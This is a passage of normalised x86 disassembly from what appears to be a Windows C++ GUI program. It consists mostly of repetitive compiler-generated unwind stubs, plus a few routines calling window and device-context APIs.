mov ecx eax
call sub_4589bd
xor eax eax
retn 0x4
sub_458530
mov eax r--data
retn
sub_4585d9
push esi
mov esi ecx
call sub_4585f8
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_4585f5
mov eax ecx
retn
sub_45913e
cmp [ ecx + 0xec ] 0x0
je r-xdata
retn 0xc
push [ esp + 0xc ]
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_448ff4
sub_459285
mov eax [ ecx + 0xf4 ]
push 0x1
inc eax
push eax
call sub_45959a
retn
sub_459295
mov eax [ ecx + 0xf4 ]
push 0x1
dec eax
push eax
call sub_45959a
retn
sub_4592a5
call sub_4589bd
call sub_4428ff
mov eax [ eax + 0x1c ]
push 0x0
push 0xe107
push 0x111
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
retn
sub_4593d0
mov edx [ esp + 0x4 ]
lea eax [ ecx + 0xec ]
cmp [ eax ] edx
je r-xdata
retn 0x10
push [ esp + 0x10 ]
mov [ eax ] edx
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_45942b
sub_4597e9
mov eax ecx
push ebx
mov ecx [ esp + 0x8 ]
xor ebx ebx
cmp [ eax + 0xec ] 0x2
mov edx [ ecx ]
setne bl
push ebx
call [ edx ]
pop ebx
retn 0x4
sub_459805
push ebx
mov eax ecx
mov ecx [ esp + 0x8 ]
xor ebx ebx
cmp [ eax + 0xec ] ebx
mov edx [ ecx ]
setne bl
push ebx
call [ edx ]
pop ebx
retn 0x4
sub_45991e
push esi
mov esi ecx
push sub_453033
mov ecx rw-data
call sub_455223
mov ecx esi
mov [ eax + 0xc ] 0x1
call sub_43e191
pop esi
retn
sub_45a0ee
mov [ ecx ] r--data
jmp sub_43da87
sub_45a0f9
push esi
mov esi ecx
call sub_45a0ee
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_45a3bb
push esi
mov esi ecx
call sub_45a465
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_45a426
push esi
mov esi ecx
push [ esi + 0x18 ]
push [ esi + 0x4 ]
call [ RestoreDC@IAT ]
mov ecx esi
call sub_446cec
pop esi
retn
sub_45ace5
xor eax eax
mov edx [ ecx ]
push eax
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push eax
push eax
push [ esp + 0x1c ]
push [ esp + 0x1c ]
call [ edx + 0x60 ]
retn 0x10
sub_45adfa
push [ ebp - 0x14 ]
call sub_441eb2
pop ecx
mov eax r-xdata
retn
sub_45aef1
push [ ebp - 0x1c ]
call sub_441eb2
mov eax [ ebp + 0x8 ]
pop ecx
and [ eax ] 0x0
and [ eax + 0x4 ] 0x0
mov eax sub_45af0a
retn
sub_45af0a
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x20
sub_45af64
push [ esp + 0x10 ]
mov eax [ ecx ]
push [ esp + 0x10 ]
push [ esp + 0x20 ]
push [ esp + 0x20 ]
call [ eax + 0x5c ]
retn 0x20
sub_45b179
mov eax [ esp + 0x4 ]
mov [ ecx + 0x20 ] eax
mov eax [ esp + 0x8 ]
mov [ ecx + 0x24 ] eax
call sub_45b10f
retn 0x8
sub_45b297
call sub_4428ff
test eax eax
je r-xdata
push [ esp + 0x4 ]
call [ PostQuitMessage@IAT ]
retn 0x4
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
push 0x1
push 0x1
call eax
sub_45b309
add ecx 0x50
push ecx
call sub_4479eb
retn
sub_45b3b6
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x0
je r-xdata
pop esi
retn
push 0x0
push 0x0
call [ CoRegisterMessageFilter@IAT ]
and [ esi + 0x1c ] 0x0
sub_45b4d0
mov ecx [ ebp - 0x10 ]
jmp sub_43da87
sub_45b4d8
mov ecx [ ebp - 0x10 ]
add ecx 0x5c
jmp sub_43c0ee
sub_45b4e3
mov eax r--data
jmp sub_42d1da
sub_45b4f0
mov ecx [ ebp - 0x14 ]
jmp sub_43da87
sub_45b4f8
mov ecx [ ebp - 0x14 ]
add ecx 0x5c
jmp sub_43c0ee
sub_45b503
mov ecx [ ebp - 0x10 ]
jmp sub_421723
sub_45b50b
mov ecx [ ebp - 0x10 ]
add ecx 0x110
jmp sub_442148
sub_45b519
mov ecx [ ebp - 0x10 ]
add ecx 0x114
jmp sub_442148
sub_45b527
mov ecx [ ebp - 0x10 ]
add ecx 0x118
jmp sub_442148
sub_45b535
mov ecx [ ebp - 0x10 ]
add ecx 0x11c
jmp sub_442148
sub_45b543
mov ecx [ ebp - 0x10 ]
add ecx 0x120
jmp sub_442148
sub_45b551
mov eax r--data
jmp sub_42d1da
sub_45b560
lea ecx [ ebp - 0x10 ]
jmp sub_442148
sub_45b568
mov eax r--data
jmp sub_42d1da
sub_45b580
lea ecx [ ebp - 0xfc ]
jmp sub_442148
sub_45b58b
lea ecx [ ebp - 0xf8 ]
jmp sub_4016f0
sub_45b596
lea ecx [ ebp - 0xf8 ]
jmp sub_43da87
sub_45b5a1
lea ecx [ ebp - 0x9c ]
jmp sub_44f0ac
sub_45b5ac
lea ecx [ ebp - 0x60 ]
jmp sub_44f0ac
sub_45b5b4
lea ecx [ ebp - 0x24 ]
jmp sub_442148
sub_45b5bc
lea ecx [ ebp - 0x20 ]
jmp sub_442148
sub_45b5c4
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45b5cc
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45b5d4
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45b5dc
lea ecx [ ebp - 0xf8 ]
jmp sub_43da87
sub_45b5e7
lea ecx [ ebp - 0x9c ]
jmp sub_44f0ac
sub_45b5f2
lea ecx [ ebp - 0x60 ]
jmp sub_44f0ac
sub_45b5fa
lea ecx [ ebp - 0x24 ]
jmp sub_442148
sub_45b602
lea ecx [ ebp - 0x20 ]
jmp sub_442148
sub_45b60a
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45b612
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45b61a
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45b622
mov eax r--data
jmp sub_42d1da
sub_45b630
mov ecx [ ebp - 0x10 ]
jmp sub_43da87
sub_45b638
mov ecx [ ebp - 0x10 ]
add ecx 0x5c
jmp sub_44f0ac
sub_45b643
mov ecx [ ebp - 0x10 ]
add ecx 0x98
jmp sub_44f0ac
sub_45b651
mov ecx [ ebp - 0x10 ]
add ecx 0xd4
jmp sub_442148
sub_45b65f
mov ecx [ ebp - 0x10 ]
add ecx 0xd8
jmp sub_442148
sub_45b66d
mov ecx [ ebp - 0x10 ]
add ecx 0xdc
jmp sub_442148
sub_45b67b
mov ecx [ ebp - 0x10 ]
add ecx 0xe0
jmp sub_442148
sub_45b689
mov ecx [ ebp - 0x10 ]
add ecx 0xe4
jmp sub_442148
sub_45b697
mov eax r--data
jmp sub_42d1da
sub_45b6b0
lea ecx [ ebp - 0xf8 ]
jmp sub_4016f0
sub_45b6bb
lea ecx [ ebp - 0xf8 ]
jmp sub_43da87
sub_45b6c6
lea ecx [ ebp - 0x9c ]
jmp sub_44f0ac
sub_45b6d1
lea ecx [ ebp - 0x60 ]
jmp sub_44f0ac
sub_45b6d9
lea ecx [ ebp - 0x24 ]
jmp sub_442148
sub_45b6e1
lea ecx [ ebp - 0x20 ]
jmp sub_442148
sub_45b6e9
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45b6f1
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45b6f9
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45b701
lea ecx [ ebp - 0x100 ]
jmp sub_442148
sub_45b70c
lea ecx [ ebp - 0x100 ]
jmp sub_442148
sub_45b717
lea ecx [ ebp - 0x100 ]
jmp sub_442148
sub_45b722
lea ecx [ ebp - 0x100 ]
jmp sub_442148
sub_45b72d
lea ecx [ ebp - 0x100 ]
jmp sub_442148
sub_45b738
lea ecx [ ebp - 0x100 ]
jmp sub_442148
sub_45b743
lea ecx [ ebp - 0x100 ]
jmp sub_442148
sub_45b74e
lea ecx [ ebp - 0xfc ]
jmp sub_442148
sub_45b759
lea ecx [ ebp - 0xf8 ]
jmp sub_43da87
sub_45b764
lea ecx [ ebp - 0x9c ]
jmp sub_44f0ac
sub_45b76f
lea ecx [ ebp - 0x60 ]
jmp sub_44f0ac
sub_45b777
lea ecx [ ebp - 0x24 ]
jmp sub_442148
sub_45b77f
lea ecx [ ebp - 0x20 ]
jmp sub_442148
sub_45b787
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45b78f
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45b797
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45b79f
lea ecx [ ebp - 0xf8 ]
jmp sub_43da87
sub_45b7aa
lea ecx [ ebp - 0x9c ]
jmp sub_44f0ac
sub_45b7b5
lea ecx [ ebp - 0x60 ]
jmp sub_44f0ac
sub_45b7bd
lea ecx [ ebp - 0x24 ]
jmp sub_442148
sub_45b7c5
lea ecx [ ebp - 0x20 ]
jmp sub_442148
sub_45b7cd
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45b7d5
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45b7dd
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45b7e5
mov eax r--data
jmp sub_42d1da
sub_45b7f0
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45b7f8
lea ecx [ ebp - 0x10 ]
jmp sub_442148
sub_45b800
mov eax r--data
jmp sub_42d1da
sub_45b810
lea ecx [ ebp - 0xf8 ]
jmp sub_4016f0
sub_45b81b
lea ecx [ ebp - 0xf8 ]
jmp sub_43da87
sub_45b826
lea ecx [ ebp - 0x9c ]
jmp sub_44f0ac
sub_45b831
lea ecx [ ebp - 0x60 ]
jmp sub_44f0ac
sub_45b839
lea ecx [ ebp - 0x24 ]
jmp sub_442148
sub_45b841
lea ecx [ ebp - 0x20 ]
jmp sub_442148
sub_45b849
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45b851
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45b859
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45b861
lea ecx [ ebp - 0x100 ]
jmp sub_442148
sub_45b86c
lea ecx [ ebp - 0x100 ]
jmp sub_442148
sub_45b877
lea ecx [ ebp - 0x100 ]
jmp sub_442148
sub_45b882
lea ecx [ ebp - 0x100 ]
jmp sub_442148
sub_45b88d
lea ecx [ ebp - 0x100 ]
jmp sub_442148
sub_45b898
lea ecx [ ebp - 0x100 ]
jmp sub_442148
sub_45b8a3
lea ecx [ ebp - 0x100 ]
jmp sub_442148
sub_45b8ae
lea ecx [ ebp - 0xfc ]
jmp sub_442148
sub_45b8b9
lea ecx [ ebp - 0xf8 ]
jmp sub_43da87
sub_45b8c4
lea ecx [ ebp - 0x9c ]
jmp sub_44f0ac
sub_45b8cf
lea ecx [ ebp - 0x60 ]
jmp sub_44f0ac
sub_45b8d7
lea ecx [ ebp - 0x24 ]
jmp sub_442148
sub_45b8df
lea ecx [ ebp - 0x20 ]
jmp sub_442148
sub_45b8e7
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45b8ef
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45b8f7
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45b8ff
lea ecx [ ebp - 0xf8 ]
jmp sub_43da87
sub_45b90a
lea ecx [ ebp - 0x9c ]
jmp sub_44f0ac
sub_45b915
lea ecx [ ebp - 0x60 ]
jmp sub_44f0ac
sub_45b91d
lea ecx [ ebp - 0x24 ]
jmp sub_442148
sub_45b925
lea ecx [ ebp - 0x20 ]
jmp sub_442148
sub_45b92d
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45b935
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45b93d
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45b945
mov eax r--data
jmp sub_42d1da
sub_45b950
mov ecx [ ebp - 0x10 ]
jmp sub_43da87
sub_45b958
mov ecx [ ebp - 0x10 ]
add ecx 0x5c
jmp sub_44f0ac
sub_45b963
mov ecx [ ebp - 0x10 ]
add ecx 0x98
jmp sub_44f0ac
sub_45b971
mov ecx [ ebp - 0x10 ]
add ecx 0xd4
jmp sub_442148
sub_45b97f
mov ecx [ ebp - 0x10 ]
add ecx 0xd8
jmp sub_442148
sub_45b98d
mov ecx [ ebp - 0x10 ]
add ecx 0xdc
jmp sub_442148
sub_45b99b
mov ecx [ ebp - 0x10 ]
add ecx 0xe0
jmp sub_442148
sub_45b9a9
mov ecx [ ebp - 0x10 ]
add ecx 0xe4
jmp sub_442148
sub_45b9b7
mov ecx [ ebp - 0x10 ]
add ecx 0xe8
jmp sub_442148
sub_45b9c5
mov eax r--data
jmp sub_42d1da
sub_45b9d0
lea ecx [ ebp - 0x134 ]
jmp sub_4026e0
sub_45b9db
lea ecx [ ebp - 0x134 ]
jmp sub_421723
sub_45b9e6
lea ecx [ ebp - 0x24 ]
jmp sub_442148
sub_45b9ee
lea ecx [ ebp - 0x20 ]
jmp sub_442148
sub_45b9f6
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45b9fe
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45ba06
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45ba0e
lea ecx [ ebp - 0x134 ]
jmp sub_421723
sub_45ba19
lea ecx [ ebp - 0x24 ]
jmp sub_442148
sub_45ba21
lea ecx [ ebp - 0x20 ]
jmp sub_442148
sub_45ba29
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45ba31
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45ba39
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45ba41
mov eax r--data
jmp sub_42d1da
sub_45ba50
mov ecx [ ebp - 0x10 ]
jmp sub_421723
sub_45ba58
mov ecx [ ebp - 0x10 ]
add ecx 0x110
jmp sub_442148
sub_45ba66
mov ecx [ ebp - 0x10 ]
add ecx 0x114
jmp sub_442148
sub_45ba74
mov ecx [ ebp - 0x10 ]
add ecx 0x118
jmp sub_442148
sub_45ba82
mov ecx [ ebp - 0x10 ]
add ecx 0x11c
jmp sub_442148
sub_45ba90
mov ecx [ ebp - 0x10 ]
add ecx 0x120
jmp sub_442148
sub_45ba9e
mov eax r--data
jmp sub_42d1da
sub_45bab0
mov ecx [ ebp - 0x10 ]
jmp sub_421723
sub_45bab8
mov ecx [ ebp - 0x10 ]
add ecx 0x110
jmp sub_442148
sub_45bac6
mov ecx [ ebp - 0x10 ]
add ecx 0x114
jmp sub_442148
sub_45bad4
mov ecx [ ebp - 0x10 ]
add ecx 0x118
jmp sub_442148
sub_45bae2
mov ecx [ ebp - 0x10 ]
add ecx 0x11c
jmp sub_442148
sub_45baf0
mov ecx [ ebp - 0x10 ]
add ecx 0x120
jmp sub_442148
sub_45bafe
mov ecx [ ebp - 0x10 ]
add ecx 0x124
jmp sub_442148
sub_45bb0c
mov eax r--data
jmp sub_42d1da
sub_45bb20
mov ecx [ ebp - 0x10 ]
jmp sub_421723
sub_45bb28
mov ecx [ ebp - 0x10 ]
add ecx 0x110
jmp sub_442148
sub_45bb36
mov ecx [ ebp - 0x10 ]
add ecx 0x114
jmp sub_442148
sub_45bb44
mov ecx [ ebp - 0x10 ]
add ecx 0x118
jmp sub_442148
sub_45bb52
mov ecx [ ebp - 0x10 ]
add ecx 0x11c
jmp sub_442148
sub_45bb60
mov ecx [ ebp - 0x10 ]
add ecx 0x120
jmp sub_442148
sub_45bb6e
mov eax r--data
jmp sub_42d1da
sub_45bb80
mov ecx [ ebp - 0x10 ]
jmp sub_43da87
sub_45bb88
mov ecx [ ebp - 0x10 ]
add ecx 0x5c
jmp sub_43c0ee
sub_45bb93
mov eax r--data
jmp sub_42d1da
sub_45bba0
mov ecx [ ebp - 0x14 ]
jmp sub_43da87
sub_45bba8
mov ecx [ ebp - 0x14 ]
add ecx 0x5c
jmp sub_43c0ee
sub_45bbb3
mov ecx [ ebp - 0x10 ]
jmp sub_421723
sub_45bbbb
mov ecx [ ebp - 0x10 ]
add ecx 0x110
jmp sub_442148
sub_45bbc9
mov ecx [ ebp - 0x10 ]
add ecx 0x114
jmp sub_442148
sub_45bbd7
mov ecx [ ebp - 0x10 ]
add ecx 0x118
jmp sub_442148
sub_45bbe5
mov ecx [ ebp - 0x10 ]
add ecx 0x11c
jmp sub_442148
sub_45bbf3
mov ecx [ ebp - 0x10 ]
add ecx 0x120
jmp sub_442148
sub_45bc01
mov ecx [ ebp - 0x10 ]
add ecx 0x124
jmp sub_442148
sub_45bc0f
mov eax r--data
jmp sub_42d1da
sub_45bc20
lea ecx [ ebp - 0x10 ]
jmp sub_442148
sub_45bc28
mov eax r--data
jmp sub_42d1da
sub_45bc40
lea ecx [ ebp - 0x13c ]
jmp sub_442148
sub_45bc4b
lea ecx [ ebp - 0x138 ]
jmp sub_403270
sub_45bc56
lea ecx [ ebp - 0x138 ]
jmp sub_43da87
sub_45bc61
lea ecx [ ebp - 0xdc ]
jmp sub_44f0ac
sub_45bc6c
lea ecx [ ebp - 0xa0 ]
jmp sub_44f0ac
sub_45bc77
lea ecx [ ebp - 0x64 ]
jmp sub_44f0ac
sub_45bc7f
lea ecx [ ebp - 0x28 ]
jmp sub_442148
sub_45bc87
lea ecx [ ebp - 0x24 ]
jmp sub_442148
sub_45bc8f
lea ecx [ ebp - 0x20 ]
jmp sub_442148
sub_45bc97
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45bc9f
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45bca7
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45bcaf
lea ecx [ ebp - 0x138 ]
jmp sub_43da87
sub_45bcba
lea ecx [ ebp - 0xdc ]
jmp sub_44f0ac
sub_45bcc5
lea ecx [ ebp - 0xa0 ]
jmp sub_44f0ac
sub_45bcd0
lea ecx [ ebp - 0x64 ]
jmp sub_44f0ac
sub_45bcd8
lea ecx [ ebp - 0x28 ]
jmp sub_442148
sub_45bce0
lea ecx [ ebp - 0x24 ]
jmp sub_442148
sub_45bce8
lea ecx [ ebp - 0x20 ]
jmp sub_442148
sub_45bcf0
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45bcf8
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45bd00
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45bd08
mov eax r--data
jmp sub_42d1da
sub_45bd20
mov ecx [ ebp - 0x10 ]
jmp sub_43da87
sub_45bd28
mov ecx [ ebp - 0x10 ]
add ecx 0x5c
jmp sub_44f0ac
sub_45bd33
mov ecx [ ebp - 0x10 ]
add ecx 0x98
jmp sub_44f0ac
sub_45bd41
mov ecx [ ebp - 0x10 ]
add ecx 0xd4
jmp sub_44f0ac
sub_45bd4f
mov ecx [ ebp - 0x10 ]
add ecx 0x110
jmp sub_442148
sub_45bd5d
mov ecx [ ebp - 0x10 ]
add ecx 0x114
jmp sub_442148
sub_45bd6b
mov ecx [ ebp - 0x10 ]
add ecx 0x118
jmp sub_442148
sub_45bd79
mov ecx [ ebp - 0x10 ]
add ecx 0x11c
jmp sub_442148
sub_45bd87
mov ecx [ ebp - 0x10 ]
add ecx 0x120
jmp sub_442148
sub_45bd95
mov ecx [ ebp - 0x10 ]
add ecx 0x124
jmp sub_442148
sub_45bda3
mov eax r--data
jmp sub_42d1da
sub_45bdb0
lea ecx [ ebp - 0x138 ]
jmp sub_403270
sub_45bdbb
lea ecx [ ebp - 0x138 ]
jmp sub_43da87
sub_45bdc6
lea ecx [ ebp - 0xdc ]
jmp sub_44f0ac
sub_45bdd1
lea ecx [ ebp - 0xa0 ]
jmp sub_44f0ac
sub_45bddc
lea ecx [ ebp - 0x64 ]
jmp sub_44f0ac
sub_45bde4
lea ecx [ ebp - 0x28 ]
jmp sub_442148
sub_45bdec
lea ecx [ ebp - 0x24 ]
jmp sub_442148
sub_45bdf4
lea ecx [ ebp - 0x20 ]
jmp sub_442148
sub_45bdfc
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45be04
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45be0c
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45be14
lea ecx [ ebp - 0x140 ]
jmp sub_442148
sub_45be1f
lea ecx [ ebp - 0x140 ]
jmp sub_442148
sub_45be2a
lea ecx [ ebp - 0x140 ]
jmp sub_442148
sub_45be35
lea ecx [ ebp - 0x140 ]
jmp sub_442148
sub_45be40
lea ecx [ ebp - 0x140 ]
jmp sub_442148
sub_45be4b
lea ecx [ ebp - 0x140 ]
jmp sub_442148
sub_45be56
lea ecx [ ebp - 0x140 ]
jmp sub_442148
sub_45be61
lea ecx [ ebp - 0x140 ]
jmp sub_442148
sub_45be6c
lea ecx [ ebp - 0x13c ]
jmp sub_442148
sub_45be77
lea ecx [ ebp - 0x138 ]
jmp sub_43da87
sub_45be82
lea ecx [ ebp - 0xdc ]
jmp sub_44f0ac
sub_45be8d
lea ecx [ ebp - 0xa0 ]
jmp sub_44f0ac
sub_45be98
lea ecx [ ebp - 0x64 ]
jmp sub_44f0ac
sub_45bea0
lea ecx [ ebp - 0x28 ]
jmp sub_442148
sub_45bea8
lea ecx [ ebp - 0x24 ]
jmp sub_442148
sub_45beb0
lea ecx [ ebp - 0x20 ]
jmp sub_442148
sub_45beb8
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45bec0
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45bec8
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45bed0
lea ecx [ ebp - 0x138 ]
jmp sub_43da87
sub_45bedb
lea ecx [ ebp - 0xdc ]
jmp sub_44f0ac
sub_45bee6
lea ecx [ ebp - 0xa0 ]
jmp sub_44f0ac
sub_45bef1
lea ecx [ ebp - 0x64 ]
jmp sub_44f0ac
sub_45bef9
lea ecx [ ebp - 0x28 ]
jmp sub_442148
sub_45bf01
lea ecx [ ebp - 0x24 ]
jmp sub_442148
sub_45bf09
lea ecx [ ebp - 0x20 ]
jmp sub_442148
sub_45bf11
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45bf19
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45bf21
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45bf29
mov eax r--data
jmp sub_42d1da
sub_45bf40
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45bf48
lea ecx [ ebp - 0x10 ]
jmp sub_442148
sub_45bf50
mov eax r--data
jmp sub_42d1da
sub_45bf60
lea ecx [ ebp - 0x138 ]
jmp sub_403270
sub_45bf6b
lea ecx [ ebp - 0x138 ]
jmp sub_43da87
sub_45bf76
lea ecx [ ebp - 0xdc ]
jmp sub_44f0ac
sub_45bf81
lea ecx [ ebp - 0xa0 ]
jmp sub_44f0ac
sub_45bf8c
lea ecx [ ebp - 0x64 ]
jmp sub_44f0ac
sub_45bf94
lea ecx [ ebp - 0x28 ]
jmp sub_442148
sub_45bf9c
lea ecx [ ebp - 0x24 ]
jmp sub_442148
sub_45bfa4
lea ecx [ ebp - 0x20 ]
jmp sub_442148
sub_45bfac
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45bfb4
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45bfbc
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45bfc4
lea ecx [ ebp - 0x140 ]
jmp sub_442148
sub_45bfcf
lea ecx [ ebp - 0x140 ]
jmp sub_442148
sub_45bfda
lea ecx [ ebp - 0x140 ]
jmp sub_442148
sub_45bfe5
lea ecx [ ebp - 0x140 ]
jmp sub_442148
sub_45bff0
lea ecx [ ebp - 0x140 ]
jmp sub_442148
sub_45bffb
lea ecx [ ebp - 0x140 ]
jmp sub_442148
sub_45c006
lea ecx [ ebp - 0x140 ]
jmp sub_442148
sub_45c011
lea ecx [ ebp - 0x140 ]
jmp sub_442148
sub_45c01c
lea ecx [ ebp - 0x13c ]
jmp sub_442148
sub_45c027
lea ecx [ ebp - 0x138 ]
jmp sub_43da87
sub_45c032
lea ecx [ ebp - 0xdc ]
jmp sub_44f0ac
sub_45c03d
lea ecx [ ebp - 0xa0 ]
jmp sub_44f0ac
sub_45c048
lea ecx [ ebp - 0x64 ]
jmp sub_44f0ac
sub_45c050
lea ecx [ ebp - 0x28 ]
jmp sub_442148
sub_45c058
lea ecx [ ebp - 0x24 ]
jmp sub_442148
sub_45c060
lea ecx [ ebp - 0x20 ]
jmp sub_442148
sub_45c068
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45c070
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45c078
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45c080
lea ecx [ ebp - 0x138 ]
jmp sub_43da87
sub_45c08b
lea ecx [ ebp - 0xdc ]
jmp sub_44f0ac
sub_45c096
lea ecx [ ebp - 0xa0 ]
jmp sub_44f0ac
sub_45c0a1
lea ecx [ ebp - 0x64 ]
jmp sub_44f0ac
sub_45c0a9
lea ecx [ ebp - 0x28 ]
jmp sub_442148
sub_45c0b1
lea ecx [ ebp - 0x24 ]
jmp sub_442148
sub_45c0b9
lea ecx [ ebp - 0x20 ]
jmp sub_442148
sub_45c0c1
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45c0c9
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45c0d1
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45c0d9
mov eax r--data
jmp sub_42d1da
sub_45c0f0
mov ecx [ ebp - 0x10 ]
jmp sub_43da87
sub_45c0f8
mov ecx [ ebp - 0x10 ]
add ecx 0x5c
jmp sub_44f0ac
sub_45c103
mov ecx [ ebp - 0x10 ]
add ecx 0x98
jmp sub_44f0ac
sub_45c111
mov ecx [ ebp - 0x10 ]
add ecx 0xd4
jmp sub_44f0ac
sub_45c11f
mov ecx [ ebp - 0x10 ]
add ecx 0x110
jmp sub_442148
sub_45c12d
mov ecx [ ebp - 0x10 ]
add ecx 0x114
jmp sub_442148
sub_45c13b
mov ecx [ ebp - 0x10 ]
add ecx 0x118
jmp sub_442148
sub_45c149
mov ecx [ ebp - 0x10 ]
add ecx 0x11c
jmp sub_442148
sub_45c157
mov ecx [ ebp - 0x10 ]
add ecx 0x120
jmp sub_442148
sub_45c165
mov ecx [ ebp - 0x10 ]
add ecx 0x124
jmp sub_442148
sub_45c173
mov ecx [ ebp - 0x10 ]
add ecx 0x128
jmp sub_442148
sub_45c181
mov eax r--data
jmp sub_42d1da
sub_45c190
lea ecx [ ebp - 0x128 ]
jmp sub_404340
sub_45c19b
lea ecx [ ebp - 0x12c ]
jmp sub_442148
sub_45c1a6
lea ecx [ ebp - 0x128 ]
jmp sub_421723
sub_45c1b1
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45c1b9
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45c1c1
mov eax r--data
jmp sub_42d1da
sub_45c1d0
mov ecx [ ebp - 0x10 ]
jmp sub_421723
sub_45c1d8
mov ecx [ ebp - 0x10 ]
add ecx 0x110
jmp sub_442148
sub_45c1e6
mov ecx [ ebp - 0x10 ]
add ecx 0x114
jmp sub_442148
sub_45c1f4
mov eax r--data
jmp sub_42d1da
sub_45c200
lea ecx [ ebp - 0x130 ]
jmp sub_442148
sub_45c20b
lea ecx [ ebp - 0x12c ]
jmp sub_404720
sub_45c216
lea ecx [ ebp - 0x12c ]
jmp sub_421723
sub_45c221
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45c229
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45c231
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45c239
lea ecx [ ebp - 0x12c ]
jmp sub_421723
sub_45c244
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45c24c
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45c254
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45c25c
mov eax r--data
jmp sub_42d1da
sub_45c270
mov ecx [ ebp - 0x10 ]
jmp sub_421723
sub_45c278
mov ecx [ ebp - 0x10 ]
add ecx 0x110
jmp sub_442148
sub_45c286
mov ecx [ ebp - 0x10 ]
add ecx 0x114
jmp sub_442148
sub_45c294
mov ecx [ ebp - 0x10 ]
add ecx 0x118
jmp sub_442148
sub_45c2a2
mov eax r--data
jmp sub_42d1da
sub_45c2b0
lea ecx [ ebp - 0x138 ]
jmp sub_442148
sub_45c2bb
lea ecx [ ebp - 0x134 ]
jmp sub_4026e0
sub_45c2c6
lea ecx [ ebp - 0x134 ]
jmp sub_421723
sub_45c2d1
lea ecx [ ebp - 0x24 ]
jmp sub_442148
sub_45c2d9
lea ecx [ ebp - 0x20 ]
jmp sub_442148
sub_45c2e1
lea ecx [ ebp - 0x1c ]
jmp sub_442148
sub_45c2e9
lea ecx [ ebp - 0x18 ]
jmp sub_442148
sub_45c2f1
lea ecx [ ebp - 0x14 ]
jmp sub_442148
sub_45c2f9
lea ecx [ ebp - 0x134 ]
jmp sub_421723
sub_45c304
lea ecx [ ebp - 0x24 ]
jmp sub_442148
sub_45c30c
lea ecx [ ebp - 0x20 ]
jmp sub_442148
sub_45c314
lea ecx [ ebp - 0x1c ]
jmp sub_442148
